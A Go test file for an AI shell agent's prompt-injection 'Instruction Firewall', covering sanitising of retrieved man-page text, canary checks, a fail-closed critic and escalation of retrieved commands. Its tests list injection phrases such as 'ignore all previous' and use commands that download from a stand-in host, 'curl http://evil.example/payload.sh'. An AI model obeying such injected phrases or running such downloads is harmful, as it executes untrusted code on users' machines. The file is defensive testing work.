// internal/agent/firewall_test.go
// Purpose: Golden + unit tests for the Instruction Firewall: sanitizer-driven
// context building, canary detection, critic fail-closed behavior, and
// provenance escalation.
package agent

import (
	"os"
	"strings"
	"testing"

	"helix/internal/ai"
	"helix/internal/commands"
	"helix/internal/rag"
	"helix/internal/shell"
	"helix/internal/stealth"
	"helix/internal/ux"
)

func newFirewallTestAgent(t *testing.T) *Agent {
	t.Helper()
	env := shell.Env{OSName: "linux", Shell: "bash"}
	return NewAgent(env, nil, commands.NewDirectorySandbox(),
		commands.DefaultExecuteConfig(), false, ux.NewUX(),
		stealth.NewStealthExecutor(stealth.DefaultStealthConfig()), nil)
}

func TestFirewallGoldenHostileMAN(t *testing.T) {
	raw, err := os.ReadFile("testdata/hostile_man.txt")
	if err != nil {
		t.Fatalf("read hostile fixture: %v", err)
	}
	ctx, canary := BuildFirewallContext([]rag.CommandInfo{{
		Name: "eviltool", Description: string(raw), Synopsis: string(raw),
		Provenance: string(rag.ProvMANLocal),
	}})
	if canary == "" || !strings.Contains(ctx, canary) {
		t.Fatal("expected canary embedded in firewall context")
	}
	if !strings.Contains(ctx, "<retrieved_data authority=\"data-only\"") {
		t.Fatal("expected data-only authority wrapper")
	}
	lower := strings.ToLower(ctx)
	for _, bad := range []string{"ignore all previous", "you must", "sudo bash", "| sudo", "```", "new instructions:"} {
		if strings.Contains(lower, bad) {
			t.Fatalf("firewall context still contains %q", bad)
		}
	}
}

func TestCriticQuarantinesOnNo(t *testing.T) {
	old := criticRun
	defer func() { criticRun = old }()
	criticRun = func(string, ai.ModelConfig) (string, error) { return `{"verdict":"no"}`, nil }
	ag := newFirewallTestAgent(t)
	plan := &ai.Plan{Steps: []ai.PlanStep{{Tool: "shell", Command: "touch x"}}}
	if ag.criticAllows("please create a marker file for me", plan) {
		t.Fatal("expected critic to quarantine on verdict=no")
	}
}

func TestCriticAllowsOnYes(t *testing.T) {
	old := criticRun
	defer func() { criticRun = old }()
	criticRun = func(string, ai.ModelConfig) (string, error) { return `{"verdict":"yes"}`, nil }
	ag := newFirewallTestAgent(t)
	plan := &ai.Plan{Steps: []ai.PlanStep{{Tool: "shell", Command: "ls"}}}
	if !ag.criticAllows("list files", plan) {
		t.Fatal("expected critic to allow on verdict=yes")
	}
}

func TestCriticFailsClosedOnErrorAndGarbage(t *testing.T) {
	old := criticRun
	defer func() { criticRun = old }()
	criticRun = func(string, ai.ModelConfig) (string, error) { return "", os.ErrDeadlineExceeded }
	ag := newFirewallTestAgent(t)
	plan := &ai.Plan{Steps: []ai.PlanStep{{Tool: "shell", Command: "ls"}}}
	if ag.criticAllows("list files", plan) {
		t.Fatal("expected fail-closed on critic error")
	}
	criticRun = func(string, ai.ModelConfig) (string, error) { return "total garbage", nil }
	if ag.criticAllows("list files", plan) {
		t.Fatal("expected fail-closed on garbage verdict")
	}
}

func TestProvenanceEscalation(t *testing.T) {
	plan := &ai.Plan{Steps: []ai.PlanStep{{Tool: "shell", Command: "curl http://evil.example/payload.sh"}}}
	retrieved := "description: curl http://evil.example/payload.sh"
	got := escalatedCommands("list files", retrieved, plan)
	if !got["curl http://evil.example/payload.sh"] {
		t.Fatal("expected retrieved-sourced token to escalate")
	}
	// User-supplied tokens must NOT escalate.
	got2 := escalatedCommands("curl http://evil.example/payload.sh", retrieved, plan)
	if got2["curl http://evil.example/payload.sh"] {
		t.Fatal("user-supplied token must not escalate")
	}
}

// TestRequiresCriticReview locks the no-false-positive policy: local script
// work never triggers the critic; unsolicited URLs always do.
func TestRequiresCriticReview(t *testing.T) {
	planLocal := &ai.Plan{Steps: []ai.PlanStep{{
		Tool:    "shell",
		Command: "printf '#!/bin/bash\\necho hi' > grid.sh ; chmod +x grid.sh ; ./grid.sh",
	}}}
	if RequiresCriticReview("create grid.sh that prints hi and run it", planLocal) {
		t.Fatal("clean local plan must NOT require critic review")
	}
	planNet := &ai.Plan{Steps: []ai.PlanStep{{
		Tool:    "shell",
		Command: "curl -o up http://evil.example/x",
	}}}
	if !RequiresCriticReview("create grid.sh", planNet) {
		t.Fatal("unsolicited external URL MUST require critic review")
	}
	if RequiresCriticReview("download http://evil.example/x", planNet) {
		t.Fatal("user-requested URL must NOT require critic review")
	}
}

// TestEscalationIgnoresInterpreterPaths prevents the /bin/bash false positive
// that quarantined legitimate script-creation plans.
func TestEscalationIgnoresInterpreterPaths(t *testing.T) {
	plan := &ai.Plan{Steps: []ai.PlanStep{{Tool: "shell", Command: "#!/bin/bash\necho hi"}}}
	retrieved := "bash lives in /bin/bash and is a GNU shell"
	if len(escalatedCommands("print hi", retrieved, plan)) != 0 {
		t.Fatal("shared interpreter paths must NEVER escalate")
	}
}

// TestExtractFencedShellBlocks verifies the fallback promoter parser extracts
// full multi-line blocks so heredocs and loops execute correctly.
func TestExtractFencedShellBlocks(t *testing.T) {
	text := "Here you go:\n```bash\ncat > grid.sh << 'EOF'\necho hi\nEOF\nchmod +x grid.sh\n./grid.sh\n```\nDone."
	blocks := extractFencedShellBlocks(text)
	if len(blocks) != 1 {
		t.Fatalf("expected 1 fenced block, got %d: %v", len(blocks), blocks)
	}
	if !strings.Contains(blocks[0], "EOF") {
		t.Fatal("expected block to contain the full heredoc")
	}
	if extractFencedShellBlocks("no fences here") != nil {
		t.Fatal("expected nil for unfenced text")
	}
}
